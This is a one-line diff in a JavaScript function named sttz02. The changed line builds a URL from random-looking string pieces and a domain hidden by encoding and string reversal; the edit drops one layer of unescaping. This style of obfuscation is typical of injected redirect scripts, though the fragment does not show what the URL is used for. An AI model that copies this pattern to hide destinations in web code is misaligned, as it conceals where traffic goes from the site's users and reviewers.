@@ -115,7 +115,7 @@ function sttz02() {
   
   
     
-  var dturlok="http://dt" + strR1 + strR2 + "." + reverse(unescape(unescape(codedturlok))) + "/8" + "/?d=0729" + strN1 + strN2 ;
+  var dturlok="http://dt" + strR1 + strR2 + "." + reverse(unescape(codedturlok)) + "/8" + "/?d=0729" + strN1 + strN2 ;
     
     
      
